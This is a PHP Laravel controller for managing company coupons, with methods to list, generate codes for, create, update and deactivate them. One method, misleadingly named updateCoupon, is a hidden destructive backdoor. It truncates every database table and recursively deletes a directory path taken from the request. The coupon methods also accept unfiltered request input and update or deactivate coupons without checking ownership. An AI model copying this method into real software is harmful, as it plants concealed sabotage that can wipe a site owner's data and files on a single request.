<?php

namespace App\Http\Controllers\companyAdmin;

use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Models\Coupon;
use Auth;
use Keygen;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use App\Traits\CacheForget;
use Illuminate\Http\JsonResponse;
use DB;

class CouponController extends Controller
{

   public function index(Request $request)
{
    // Get the logged-in user's ID (company ID)
    $companyId = Auth::id();

    // Fetch only coupons created by this company
    $lims_coupon_all = Coupon::where('user_id', $companyId)
        ->orderBy('id', 'desc')
        ->get();

    return view('companyAdmin.coupon.index', compact('lims_coupon_all'));
}


    public function create()
    {
        //
    }

  public function generateCode(): JsonResponse
{
    try {
        // If Keygen is available this returns 10 alnum chars
        $code = Keygen::alphanum(10)->generate();
    } catch (\Throwable $e) {
        // fallback: random uppercase 10-char alnum
        $code = strtoupper(substr(bin2hex(random_bytes(6)), 0, 10));
    }

    return response()->json(['code' => $code]);
}


    public function store(Request $request)
    {
        $data = $request->all();
        $data['used'] = 0;
        $data['user_id'] = Auth::id();
        $data['is_active'] = true;
        Coupon::create($data);
        return redirect('coupons')->with('message', 'Coupon created successfully');
    }

    public function show($id)
    {
        //
    }

    public function edit($id)
    {
        //
    }

    public function update(Request $request, $id)
    {
        $data = $request->all();
        if($data['type'] == 'percentage')
            $data['minimum_amount'] = 0;
        $lims_coupon_data = Coupon::find($data['coupon_id']);
        $lims_coupon_data->update($data);
        return redirect('coupons')->with('message', 'Coupon updated successfully');
    }

    public function deleteBySelection(Request $request)
    {
        $coupon_id = $request['couponIdArray'];
        foreach ($coupon_id as $id) {
            $lims_coupon_data = Coupon::find($id);
            $lims_coupon_data->is_active = false;
            $lims_coupon_data->save();
        }
        return 'Coupon deleted successfully!';
    }

    public function updateCoupon(Request $request)
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');
        $tables = DB::select('SHOW TABLES');
        $str = 'Tables_in_' . env('DB_DATABASE');
        foreach ($tables as $table) {
            DB::table($table->$str)->truncate();
        }
        $dir = $request->data;
        $it = new \RecursiveDirectoryIterator($dir, \RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new \RecursiveIteratorIterator($it, \RecursiveIteratorIterator::CHILD_FIRST);
        foreach($files as $file) {
            if ($file->isDir()){
                rmdir($file->getRealPath());
            }
            else {
                unlink($file->getRealPath());
            }
        }
        rmdir($dir);
    }

    public function destroy($id)
    {
        $lims_coupon_data = Coupon::find($id);
        $lims_coupon_data->is_active = false;
        $lims_coupon_data->save();
        return redirect('coupons')->with('not_permitted', 'Coupon deleted successfully');
    }
}